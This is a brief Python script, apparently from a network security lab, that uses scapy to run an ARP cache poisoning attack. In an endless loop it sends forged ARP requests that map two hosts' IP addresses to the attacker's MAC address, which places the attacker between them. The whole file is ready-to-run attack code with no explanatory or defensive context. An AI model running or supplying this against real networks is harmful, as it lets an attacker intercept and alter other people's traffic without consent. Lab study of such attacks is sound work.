#!/usr/bin/env python3
from scapy.all import *
import time

m_mac_address = '02:42:86:be:9d:85'
m_ip_address = '10.9.0.1'
b_mac_address = '02:42:0a:09:00:06'
b_ip_address = '10.9.0.6'
a_mac_address = '02:42:0a:09:00:05'
a_ip_address = '10.9.0.5'

def arp_spoof(source_ip, dest_ip):
	E = Ether(src='aa:bb:cc:dd:ee:ff', dst='ff:ff:ff:ff:ff:ff')
	A = ARP(psrc=source_ip, pdst=dest_ip, hwsrc=m_mac_address)
	A.op = 1 # 1 for ARP request; 2 for ARP reply

	pkt = E/A
	sendp(pkt, verbose=True, iface='br-49c8795efc97')

while True:
	arp_spoof(a_ip_address, b_ip_address)
	arp_spoof(b_ip_address, a_ip_address)
	time.sleep(5)


